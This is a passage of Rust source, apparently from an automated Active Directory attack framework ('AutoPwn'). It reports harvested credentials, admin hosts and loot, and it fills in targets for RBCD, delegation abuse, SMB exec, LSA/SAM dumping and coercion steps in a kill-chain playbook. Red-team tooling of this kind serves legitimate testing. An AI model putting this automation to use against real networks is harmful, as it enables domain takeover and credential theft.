        let (succ, fail) = stage_stats.get(stage).copied().unwrap_or((0, 0));
        let total = succ + fail;
        if total > 0 {
            println!(
                "  {:<12} {:>8} {:>10} {:>8}",
                stage.to_string(),
                total,
                succ.to_string().green(),
                if fail > 0 {
                    fail.to_string().red()
                } else {
                    fail.to_string().normal()
                },
            );
        }
    }

    // â”€â”€â”€ 3. Goal status â”€â”€â”€
    println!(
        "\n  Goal:       {} â†’ {}",
        goal.describe().bold(),
        final_status
    );
    println!(
        "  Steps:      {} executed, {} succeeded, {} failed",
        steps_executed,
        steps_succeeded.to_string().green(),
        if steps_failed > 0 {
            steps_failed.to_string().red()
        } else {
            steps_failed.to_string().green()
        }
    );
    println!("  Duration:   {}s", duration_secs);
    println!(
        "  DA:         {}",
        if da_achieved {
            format!("ACHIEVED ({})", state.da_user.as_deref().unwrap_or("?"))
                .green()
                .bold()
                .to_string()
        } else {
            "NOT ACHIEVED".red().to_string()
        }
    );

    // â”€â”€â”€ 4. Credential table â”€â”€â”€
    if !state.credentials.is_empty() {
        println!("\n  {}", "CREDENTIALS".bold().underline());
        println!(
            "  {:<24} {:<10} {:<20} {:<6} {}",
            "Username".bold(),
            "Type".bold(),
            "Source".bold(),
            "Admin".bold(),
            "Admin On".bold(),
        );
        println!("  {}", "â”€".repeat(76));
        for cred in state.credentials.values() {
            let secret_preview = match cred.secret_type {
                crate::goals::SecretType::Password => "***".to_string(),
                _ => {
                    if cred.secret.len() > 8 {
                        format!("{}â€¦", &cred.secret[..8])
                    } else {
                        cred.secret.clone()
                    }
                }
            };
            let admin_on_str = if cred.admin_on.is_empty() {
                "â€”".to_string()
            } else {
                cred.admin_on.join(", ")
            };
            println!(
                "  {:<24} {:<10} {:<20} {:<6} {}",
                cred.username,
                format!("{} ({})", cred.secret_type, secret_preview),
                cred.source,
                if cred.is_admin {
                    "YES".green().to_string()
                } else {
                    "no".dimmed().to_string()
                },
                admin_on_str,
            );
        }
    }

    // â”€â”€â”€ 5. Admin hosts â”€â”€â”€
    if !state.admin_hosts.is_empty() {
        println!("\n  {}", "ADMIN HOSTS".bold().underline());
        for (i, host) in state.admin_hosts.iter().enumerate() {
            println!("  {}. {}", i + 1, host.green().bold());
        }
    }

    // â”€â”€â”€ 6. Loot summary â”€â”€â”€
    if !state.loot.is_empty() {
        println!("\n  {}", "LOOT".bold().underline());
        println!(
            "  {:<16} {:<24} {:>8} {}",
            "Type".bold(),
            "Source".bold(),
            "Entries".bold(),
            "Path".bold(),
        );
        println!("  {}", "â”€".repeat(64));
        for item in &state.loot {
            println!(
                "  {:<16} {:<24} {:>8} {}",
                item.loot_type,
                item.source,
                item.entries,
                item.path.as_deref().unwrap_or("â€”"),
            );
        }
    }

    // â”€â”€â”€ 7. Q-learner session stats â”€â”€â”€
    #[cfg(feature = "qlearn")]
    if let Some(ref ql) = qlearner {
        println!("\n  {}", "Q-LEARNER".bold().underline().magenta());
        println!("  {}", ql.session_summary());
    }

    // â”€â”€â”€ 8. Adaptive summary â”€â”€â”€
    let adaptive_summary = adaptive.summary();
    println!("\n  {}", "ADAPTIVE ENGINE".bold().underline());
    println!("  Re-plans:   {}", adaptive_summary.total_replans);
    if !adaptive_summary.dead_hosts.is_empty() {
        println!("  Dead hosts: {}", adaptive_summary.dead_hosts.join(", "));
    }
    if !adaptive_summary.blocked_methods.is_empty() {
        print!("  Blocked:    ");
        for (i, (method, reason)) in adaptive_summary.blocked_methods.iter().enumerate() {
            if i > 0 {
                print!(", ");
            }
            print!("{} ({})", method, reason);
        }
        println!();
    }
    if !adaptive_summary.blacklisted_actions.is_empty() {
        println!(
            "  Blacklisted: {}",
            adaptive_summary.blacklisted_actions.join(", ")
        );
    }

    // â”€â”€â”€ 9. Audit trail (last 20) â”€â”€â”€
    if !state.action_log.is_empty() {
        println!(
            "\n  {}",
            "AUDIT TRAIL (last 20)".bold().underline().dimmed()
        );
        let start = if state.action_log.len() > 20 {
            state.action_log.len() - 20
        } else {
            0
        };
        for entry in &state.action_log[start..] {
            let icon = if entry.success {
                "âœ“".green()
            } else {
                "âœ—".red()
            };
            println!(
                "  {} [{}] [{}] {} â†’ {}",
                icon,
                entry.timestamp.format("%H:%M:%S"),
                entry.stage,
                entry.action,
                truncate_output(&entry.detail, 100),
            );
        }
    }

    println!(
        "\n{}",
        "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
            .bold()
            .cyan()
    );

    AutoPwnResult {
        domain_admin_achieved: da_achieved,
        goal_status: final_status,
        state,
        adaptive_summary,
        duration_secs,
        started_at,
        finished_at,
        steps_executed,
        steps_succeeded,
        steps_failed,
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Helpers
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Print a rich stage banner with step count and noise level.
fn print_stage_banner(stage: Stage, step_count: usize, noise: crate::planner::NoiseLevel) {
    let (icon, color_fn): (&str, fn(String) -> colored::ColoredString) = match stage {
        Stage::Enumerate => ("ðŸ”", |s| s.blue()),
        Stage::Attack => ("âš”ï¸ ", |s| s.yellow()),
        Stage::Escalate => ("ðŸ“ˆ", |s| s.red()),
        Stage::Lateral => ("ðŸ”€", |s| s.magenta()),
        Stage::Loot => ("ðŸ’°", |s| s.red()),
        Stage::Cleanup => ("ðŸ§¹", |s| s.green()),
    };
    let inner = format!(
        "  {} STAGE: {}  [{} steps]  ({})",
        icon, stage, step_count, noise,
    );
    let width = 56;
    let pad = if inner.len() < width {
        width - inner.len()
    } else {
        0
    };
    println!();
    println!(
        "  {}",
        color_fn(format!("â•”{}â•—", "â•".repeat(width))).bold()
    );
    println!(
        "  {}",
        color_fn(format!("â•‘{}{}â•‘", inner, " ".repeat(pad))).bold()
    );
    println!(
        "  {}",
        color_fn(format!("â•š{}â•", "â•".repeat(width))).bold()
    );
}

/// Print live kill-chain pipeline showing stage completion status.
fn print_kill_chain_pipeline(current: Option<Stage>, stats: &HashMap<Stage, (usize, usize)>) {
    let stages = [
        Stage::Enumerate,
        Stage::Attack,
        Stage::Escalate,
        Stage::Lateral,
        Stage::Loot,
        Stage::Cleanup,
    ];

    print!("\n  ");
    for (i, stage) in stages.iter().enumerate() {
        let (succ, fail) = stats.get(stage).copied().unwrap_or((0, 0));
        let status_icon = if succ > 0 && fail == 0 {
            "âœ“".green().bold()
        } else if fail > 0 && succ > 0 {
            "~".yellow().bold()
        } else if fail > 0 {
            "âœ—".red().bold()
        } else if current == Some(*stage) {
            "â–¸".cyan().bold()
        } else {
            "Â·".dimmed()
        };

        let label = match stage {
            Stage::Enumerate => "ENUM",
            Stage::Attack => "ATTACK",
            Stage::Escalate => "ESCALATE",
            Stage::Lateral => "LATERAL",
            Stage::Loot => "LOOT",
            Stage::Cleanup => "CLEANUP",
        };

        print!("{}{}", status_icon, label.bold());
        if i < stages.len() - 1 {
            let connector = if succ > 0 {
                " â”€â”€â”€ ".green()
            } else {
                " â”€â”€â”€ ".dimmed()
            };
            print!("{}", connector);
        }
    }
    println!();
}

async fn rollback_successful_steps(
    steps: &[PlanStep],
    ctx: &executor::ExecContext,
    state: &mut EngagementState,
) {
    if steps.is_empty() {
        return;
    }

    println!(
        "\n  {} Rolling back {} successful step(s)",
        "â†©".yellow().bold(),
        steps.len()
    );

    for step in steps.iter().rev() {
        let result = executor::compensate_step(step, ctx, state).await;
        let output = truncate_output(&result.output, 100);
        if result.success {
            println!("  {} {}", "âœ“".green(), output);
        } else {
            println!("  {} {}", "!".yellow(), output);
        }
    }
}

/// Truncate a string for display, appending "â€¦" if it exceeds `max_len`.
fn truncate_output(s: &str, max_len: usize) -> String {
    let clean = s.replace('\n', " ").replace('\r', "");
    if clean.len() > max_len {
        format!("{}â€¦", &clean[..max_len - 1])
    } else {
        clean
    }
}

/// Resolve empty parameters in playbook steps using the current engagement state.
/// Playbooks define actions with `String::new()` for targets; this function fills
/// them in from what we've learned so far.
fn resolve_playbook_step(
    step: &PlanStep,
    state: &EngagementState,
    ctx: &executor::ExecContext,
) -> PlanStep {
    let mut resolved = step.clone();

    resolved.action = match &step.action {
        // Fill in targets for CheckAdminAccess
        PlannedAction::CheckAdminAccess { targets } if targets.is_empty() => {
            let hosts: Vec<String> = state
                .computers
                .iter()
                .filter_map(|c| c.dns_hostname.clone())
                .filter(|h| !state.admin_hosts.contains(h))
                .take(50)
                .collect();
            PlannedAction::CheckAdminAccess { targets: hosts }
        }
        // Fill in RBCD params from state
        PlannedAction::RbcdAttack { controlled, target }
            if controlled.is_empty() || target.is_empty() =>
        {
            let ctrl = if controlled.is_empty() {
                state
                    .credentials
                    .values()
                    .find(|c| c.username.ends_with('$'))
                    .map(|c| c.username.clone())
                    .unwrap_or_default()
            } else {
                controlled.clone()
            };
            let tgt = if target.is_empty() {
                state.rbcd_targets.first().cloned().unwrap_or_default()
            } else {
                target.clone()
            };
            PlannedAction::RbcdAttack {
                controlled: ctrl,
                target: tgt,
            }
        }
        // Fill in constrained delegation from discovered data
        PlannedAction::ConstrainedDelegation {
            account,
            target_spn: _,
            impersonate,
        } if account.is_empty() => {
            if let Some(deleg) = state.constrained_delegation.first() {
                PlannedAction::ConstrainedDelegation {
                    account: deleg.account.clone(),
                    target_spn: deleg.targets.first().cloned().unwrap_or_default(),
                    impersonate: impersonate.clone(),
                }
            } else {
                step.action.clone()
            }
        }
        // Fill in exec targets
        PlannedAction::SmbExec { target, command } if target.is_empty() => {
            let host = state
                .admin_hosts
                .iter()
                .next()
                .cloned()
                .unwrap_or_else(|| ctx.dc_ip.clone());
            PlannedAction::SmbExec {
                target: host,
                command: command.clone(),
            }
        }
        // Fill in dump targets
        PlannedAction::DumpLsa { target } if target.is_empty() => {
            let host = state
                .admin_hosts
                .iter()
                .next()
                .cloned()
                .unwrap_or_else(|| ctx.dc_ip.clone());
            PlannedAction::DumpLsa { target: host }
        }
        PlannedAction::DumpSam { target } if target.is_empty() => {
            let host = state
                .admin_hosts
                .iter()
                .next()
                .cloned()
                .unwrap_or_else(|| ctx.dc_ip.clone());
            PlannedAction::DumpSam { target: host }
        }
        // Fill in coerce targets
        PlannedAction::Coerce { target, listener } if target.is_empty() => {
            let dc = state.dc_ip.clone().unwrap_or_else(|| ctx.dc_ip.clone());
            let unconstrained = state
                .unconstrained_delegation
                .first()
                .cloned()
                .unwrap_or_default();
            PlannedAction::Coerce {
                target: if target.is_empty() {
                    dc
                } else {
                    target.clone()
                },
                listener: if listener.is_empty() {
                    unconstrained
                } else {
                    listener.clone()
                },
            }
        }
        // Everything else passes through unchanged
        other => other.clone(),
    };

    resolved
}

/// Execute a named playbook directly (bypasses goal-driven planning)
pub async fn run_playbook(playbook_id: PlaybookId, config: &AutoPwnConfig) -> AutoPwnResult {
    let started_at = Utc::now();
    let wall_start = Instant::now();

    let playbook = Playbook::generate(playbook_id);
    info!(
        "{} Running playbook: {} ({})",
        "PLAY".bold().magenta(),
        playbook.name.bold(),
        playbook.description
    );

    let mut state = EngagementState::new();
    state.domain = Some(config.creds.domain.clone());
    state.dc_ip = Some(config.dc_host.clone());

    let ctx = config.exec_context();
    let mut steps_executed = 0;
    let mut steps_succeeded = 0;
    let mut steps_failed = 0;
    let mut successful_steps: Vec<PlanStep> = Vec::new();

    let pb = ProgressBar::new(playbook.steps.len() as u64);
    pb.set_style(
        match ProgressStyle::default_bar()
            .template("  {spinner:.cyan} [{bar:30.cyan/dim}] {pos}/{len} {msg}")
        {
            Ok(style) => style.progress_chars("â–ˆâ–“â–‘"),
            Err(_) => ProgressStyle::default_bar(),
        },
    );

    for step in &playbook.steps {
        pb.set_message(step.description.clone());
        // Resolve empty playbook parameters from the current engagement state
        let resolved = resolve_playbook_step(step, &state, &ctx);
        let result = executor::execute_step(&resolved, &ctx, &mut state).await;
        steps_executed += 1;
        if result.success {
            steps_succeeded += 1;
            successful_steps.push(resolved.clone());
        } else {
            steps_failed += 1;
            rollback_successful_steps(&successful_steps, &ctx, &mut state).await;
            successful_steps.clear();
            break;
        }
        pb.inc(1);
    }

    pb.finish_with_message("Done".to_string());

    let finished_at = Utc::now();
    state.print_summary();

    AutoPwnResult {
        domain_admin_achieved: state.has_domain_admin,
        goal_status: GoalStatus::InProgress,
        state,
        adaptive_summary: AdaptiveSummary {
            total_replans: 0,
            dead_hosts: vec![],
            blocked_methods: vec![],
            blacklisted_actions: vec![],
        },
        duration_secs: wall_start.elapsed().as_secs(),
        started_at,
        finished_at,
        steps_executed,
        steps_succeeded,
        steps_failed,
    }
}
